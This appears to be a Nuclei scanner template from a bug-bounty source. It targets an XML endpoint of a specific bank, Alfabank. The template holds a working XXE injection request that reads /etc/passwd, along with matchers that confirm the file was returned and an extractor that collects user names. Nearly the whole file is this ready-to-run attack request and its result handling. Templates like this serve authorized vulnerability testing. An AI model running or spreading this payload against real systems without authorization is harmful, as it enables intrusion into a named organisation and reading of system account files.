id: alfabank-xxe

info:
  name: Alfabank - XXE via XML Endpoints
  author: bugbounty
  severity: high
  description: XML External Entity injection with /etc/passwd extraction
  tags: xxe,alfabank
  reference:
    - https://portswigger.net/web-security/xxe

http:
  - raw:
      - |
        POST /_/_currency.xml HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml
        Accept: application/xml,text/xml

        <?xml version="1.0"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <root>&xxe;</root>

    matchers-condition: and
    matchers:
      - type: regex
        name: passwd-file
        part: body
        regex:
          - "root:[x*]:0:0:"
          - "bin:[x*]:[0-9]+:[0-9]+:"
        condition: or

      - type: word
        part: content_type
        words:
          - "xml"
          - "text/plain"
        condition: or

      - type: dsl
        dsl:
          - 'len(body) > 100'
          - 'status_code == 200'
        condition: and

    extractors:
      - type: regex
        name: extracted_users
        part: body
        regex:
          - "([a-z_][a-z0-9_-]*):([x*]):([0-9]+):([0-9]+):"
